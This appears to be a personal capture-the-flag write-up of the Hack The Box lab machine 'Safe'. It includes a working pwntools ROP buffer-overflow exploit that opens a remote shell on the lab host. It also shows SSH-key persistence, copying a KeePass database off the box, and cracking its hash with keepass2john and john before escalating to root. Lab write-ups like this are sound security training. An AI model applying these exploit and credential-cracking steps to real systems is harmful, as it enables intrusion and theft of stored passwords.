---
title: Hack The Box Safe Write Up
published: true
---
Hey Guys.This is my write up about safe from hack the box.

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/safe.png)

It is linux box and rated as easy.It is an oscp like box so let’s get jump in.

As always we start with nmap to scan for open port and services.

# [](#header-3)Enumeration

# [](#header-4)Nmap 
```
root@ch4n:~/Desktop/htb/boxes/safe# nmap -sC -sV 10.10.10.147
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 20:08 EST
Nmap scan report for 10.10.10.147
Host is up (0.30s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.46 seconds
```
Here is nmap scan and we got http on port 80 and ssh on port 22.

So nothing was interesting there and let’s go to the web page.

# [](#header-4)Web Page
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/web_page.png)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/web_page_source.png)

So when I check the web page source,I found that myapp is running on port 1337.

So let’s see port 1337 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/port_1337.png)

In here we got some text.So I downloaded myapp to my machine.And Let’s analyze it.

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/checksec_myapp.png)

So in here when we check the file,it is an 64bit binary and NX is enabled but PIE is not..

So let’s disassemble the binary and let’s see how the program works..

I opened it up  in ghidra and check the main function.It is interesting one:-)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/ghidra.png)

```
undefined8 main(void)

{
  char local_78 [112];
  
  system("/usr/bin/uptime");
  printf("\nWhat do you want me to echo back? ");
  gets(local_78);
  puts(local_78);
  return 0;
}
```
When we look up the code in main function you can see that the system excute usr/bin/uptime and it print What do you want to echo me back?

There are also gets and puts.

# [](#header-3)Exploitation 

I opened myapp with gdb and let’s calculate the offset:-)

I created the pattern and then run and put the pattern then program was crashed:-)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/pattern_offset%201.png)

 we can calculate the offset.It is 120.Then I create the pattern with 112 and added 8 bytes of b at the end.
 
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/pattern_offset2.png)

In here we  can see that rbp register contains bbbbbbbb and it shows that This  offset  can control RIP with 120 bytes + 8 bytes:-)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/rbp_registers.png)

# [](#header-4)Writing Exploit 
I can’t  put the shellcode on the stack because NX is enabled so the stack isn’t executable. 

we can use the system function cause PIE is not enable so the address for system doesn't change

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/grep%20pop.png)

I used ropper -f myapp to find rop gadgets

So we will use this one:-)

```
0x0000000000401206: pop r13; pop r14; pop r15; ret; 
```
# [](#header-4)Exploit
```
from pwn import*

p = remote("10.10.10.147" , 1337)
context(os="linux", arch="amd64")

JUNK  = "A"* 112
sh = "/bin/sh\x00"
system = p64(0x401040)
test = p64(0x401152)
r13 = p64(0x401206)

payload = JUNK + sh + r13 + system + "BBBBBBBB" + "CCCCCCCC" + test

p.recvline()
p.sendline(payload)
p.interactive()
```
After running this code we got the shell as user so this shell is not fully interactive so I added our ssh key to authorized_keys 

Then connect with sssh
```
user@safe:~$ ls -la
total 11284
drwxr-xr-x 3 user user    4096 May 13  2019 .
drwxr-xr-x 3 root root    4096 May 13  2019 ..
lrwxrwxrwx 1 user user       9 May 13  2019 .bash_history -> /dev/null
-rw-r--r-- 1 user user     220 May 13  2019 .bash_logout
-rw-r--r-- 1 user user    3526 May 13  2019 .bashrc
-rw-r--r-- 1 user user 1907614 May 13  2019 IMG_0545.JPG
-rw-r--r-- 1 user user 1916770 May 13  2019 IMG_0546.JPG
-rw-r--r-- 1 user user 2529361 May 13  2019 IMG_0547.JPG
-rw-r--r-- 1 user user 2926644 May 13  2019 IMG_0548.JPG
-rw-r--r-- 1 user user 1125421 May 13  2019 IMG_0552.JPG
-rw-r--r-- 1 user user 1085878 May 13  2019 IMG_0553.JPG
-rwxr-xr-x 1 user user   16592 May 13  2019 myapp
-rw-r--r-- 1 user user    2446 May 13  2019 MyPasswords.kdbx
-rw-r--r-- 1 user user     675 May 13  2019 .profile
drwx------ 2 user user    4096 Jan 15 10:32 .ssh
-rw------- 1 user user      33 May 13  2019 user.txt
```
 In user directory,there are images and interesting files called MyPasswords.kdbx 

```
scp -i safe user@10.10.10.147:* .
```
After downloading all files,I made a simple bash line:-)

```
root@ch4n:~/Desktop/htb/boxes/safe# keepass2john MyPasswords.kdbx > hash;for i in *.JPG;do keepass2john -k $i MyPasswords.kdbx; done >> hash
```

```
root@ch4n:~/Desktop/htb/boxes/safe# cat hash
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2
```
I used john to crack the pass

```
root@ch4n:~/Desktop/htb/boxes/safe# john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt hash
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (KeePass [SHA256 AES 32/64])
Remaining 6 password hashes with 6 different salts
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bullshit         (MyPasswords)
```
here we grab the pass as bullshit

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/kpcli_pass.png)

then login and with su cmd and grab the root flag 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/Hack%20the%20box%20machines%20images/safe/root.png)

That's it guys.

Enjoy my write up:-)

<script src="https://www.hackthebox.eu/badge/81292"></script>
